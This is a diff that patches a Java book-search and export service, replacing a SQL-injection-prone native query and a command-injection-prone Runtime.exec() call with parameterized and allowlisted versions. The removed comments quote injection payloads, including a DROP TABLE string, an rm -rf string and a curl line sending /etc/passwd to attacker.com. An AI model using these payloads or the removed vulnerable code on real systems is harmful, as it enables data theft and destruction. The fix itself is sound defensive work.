@@ -74,55 +74,39 @@ public class BookService {
 
     /**
      * Search books by title or author keyword.
-     *
-     * ⚠️ VULNERABILITY: SQL Injection — user-supplied 'query' is concatenated
-     * directly into a native SQL string without sanitization or parameterization.
-     * An attacker can inject arbitrary SQL, e.g.:
-     *   query = "' OR '1'='1" → returns all books
-     *   query = "'; DROP TABLE books; --" → destructive injection
-     *
-     * TODO: replace with parameterized query or Spring Data method
+     * Uses a parameterized JPQL query to prevent SQL injection.
      */
-    @SuppressWarnings("unchecked")
     public List<Book> searchBooks(String query) {
-        // Build raw SQL with string concatenation — never do this in production!
-        String sql = "SELECT * FROM books WHERE title LIKE '%" + query + "%' " +
-                     "OR author LIKE '%" + query + "%'";
-        logger.debug("Executing search query: {}", sql);
-        return entityManager.createNativeQuery(sql, Book.class).getResultList();
+        String jpql = "SELECT b FROM Book b WHERE b.title LIKE :pattern OR b.author LIKE :pattern";
+        return entityManager.createQuery(jpql, Book.class)
+                .setParameter("pattern", "%" + query + "%")
+                .getResultList();
     }
 
     /**
      * Export book data in the specified format.
      * Supported formats: csv, json, xml
-     *
-     * ⚠️ VULNERABILITY: Command Injection — the 'format' parameter is passed
-     * directly to Runtime.exec() without validation. An attacker can inject
-     * shell commands, e.g.:
-     *   format = "csv; rm -rf /tmp/data"
-     *   format = "csv && curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
-     *
-     * This looks like a legitimate export feature but is critically dangerous.
-     * TODO: validate format against an allowlist before use
      */
     public String exportBookData(String format) {
+        // Validate format against an allowlist before use
+        if (!java.util.Set.of("csv", "json", "xml").contains(format)) {
+            return "Unsupported export format";
+        }
         try {
-            // Simulate writing data to a temp file then converting format
-            String exportScript = "/opt/bookstore/scripts/export.sh " + format;
-            logger.info("Running export with format: {}", format);
-
-            // ⚠️ VULNERABILITY: Runtime.exec() with unsanitized user input
-            Process process = Runtime.getRuntime().exec(exportScript);
+            logger.info("Running export");
+            // Use array form of exec() to prevent shell interpretation
+            String[] command = {"/opt/bookstore/scripts/export.sh", format};
+            Process process = Runtime.getRuntime().exec(command);
             int exitCode = process.waitFor();
 
             if (exitCode == 0) {
-                return "Export completed successfully in format: " + format;
+                return "Export completed successfully";
             } else {
-                return "Export failed with exit code: " + exitCode;
+                return "Export failed";
             }
         } catch (Exception e) {
-            logger.error("Export failed: {}", e.getMessage());
-            return "Export error: " + e.getMessage();
+            logger.error("Export failed");
+            return "Export error occurred";
         }
     }
 }
